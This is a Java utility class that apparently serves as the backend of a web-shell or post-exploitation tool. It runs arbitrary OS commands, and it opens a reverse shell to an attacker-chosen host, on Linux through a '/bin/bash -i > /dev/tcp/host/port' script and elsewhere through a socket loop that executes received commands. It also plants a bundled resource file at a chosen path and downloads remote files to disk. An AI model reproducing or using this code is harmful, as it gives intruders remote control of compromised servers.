import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;

public class Utils {
	
	static String os = System.getProperty("os.name").toLowerCase();

	public static String exec(String cmd) {
		String result="";
		try {
			if (cmd!=null&&cmd.trim().length()>0) {
				if (os.startsWith("windows")) {
					cmd="cmd.exe /c "+ cmd;
				}else {
					cmd="/bin/sh -c "+ cmd;
				}
				InputStream inputStream= Runtime.getRuntime().exec(cmd).getInputStream();
				
				int read=0;
				while ((read=inputStream.read())!=-1) {
					result+=(char)read;
				}
			}
		} catch (Exception e) {
			result=e.getMessage();
		}
		return result;
	}
	
	public static String shell(String host, int port) {
		
		String result = "";
		if (host != null && host.trim().length() > 0 && port > 0) {
			try {
				if (os.startsWith("linux")) {
					
					String name="wooyun.sh";
					File file=new File(name);
					
					FileWriter writer=new FileWriter(file);
					writer.write("/bin/bash -i > /dev/tcp/"+host+"/"+port+" 0<&1 2>&1"+"\n");
					writer.flush();
					writer.close();
					Runtime.getRuntime().exec("chmod u+x "+name);
					Process process = Runtime.getRuntime().exec("bash "+name);
					process.waitFor();
					
					file.delete();
				} else {
					Socket socket = new Socket(host, port);
					OutputStream out = socket.getOutputStream();
					InputStream in = socket.getInputStream();
					out.write(("whoami:\t" + exec("whoami")).getBytes());
					int a = 0;
					byte[] b = new byte[4096];
					while ((a = in.read(b)) != -1) {
						out.write(exec(new String(b, 0, a, "UTF-8").trim()).getBytes("UTF-8"));
					}
				}
			} catch (Exception e) {
				result = e.getMessage();
			}

		} else {
			result = "host and port are required";
		}
		
		return result;
	}
	
	public static String upload(String path) {
		String result="";
		try {
			if (path!=null&&path.trim().length()>0) {
				FileOutputStream fos=new FileOutputStream(new File(path));
				InputStream inputStream =new Utils().getClass().getResourceAsStream("/resource/one.txt");
				BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
				String temp = "";
				while (reader.ready()) {
					temp += reader.readLine() + "\n";
				}
				fos.write(temp.getBytes());
				fos.flush();
				fos.close();
				result="Upload Success";
			}else {
				result="Path is required";
			}
		} catch (Exception e) {
			result =e.getMessage();
		}
		return result;
	}
	
	public static String download(String url, String path) {
		String result="";
		try {
			
			if (url!=null&&url.trim().length()>0&&path!=null&&path.trim().length()>0) {
				URLConnection conn=new URL(url).openConnection();
				conn.setReadTimeout(10*60*1000);
				conn.setReadTimeout(10*60*1000);
				InputStream inputStream=conn.getInputStream();
				int read=0;
				FileOutputStream fos=new FileOutputStream(new File(path));
				while ((read=inputStream.read())!=-1) {
					fos.write(read);
				}
				fos.flush();
				fos.close();
			}else {
				result="Url and path are required";
			}
		} catch (Exception e) {
			result =e.getMessage();
		}
		return result;
	}

	public static String getClassPath() {
		return new Utils().getClass().getClassLoader().getResource("/").getPath();
	}
	
}
